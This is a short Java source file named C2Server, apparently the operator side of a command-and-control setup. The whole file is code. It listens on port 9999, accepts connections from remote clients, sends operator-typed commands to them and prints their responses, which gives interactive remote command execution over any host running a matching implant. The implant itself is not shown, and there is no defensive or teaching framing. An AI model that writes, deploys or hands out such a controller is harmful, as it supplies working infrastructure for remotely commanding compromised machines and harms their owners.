import java.io.*;
        import java.net.*;

public class C2Server {
    public static void main(String[] args) {
        int port = 9999;
        try (ServerSocket serverSocket = new ServerSocket(port)) {
            System.out.println("[*] Listening on port " + port);
            while (true) {
                Socket clientSocket = serverSocket.accept();
                System.out.println("[*] Accepted connection from " + clientSocket.getInetAddress());
                handleClient(clientSocket);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void handleClient(Socket clientSocket) {
        try (BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
             PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
             BufferedReader userInput = new BufferedReader(new InputStreamReader(System.in))) {

            String command;
            while (true) {
                System.out.print("Enter command to send: ");
                command = userInput.readLine();
                if (command.equalsIgnoreCase("exit")) {
                    out.println("exit");
                    break;
                }
                out.println(command);
                String response = in.readLine();
                System.out.println("[*] Response: " + response);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

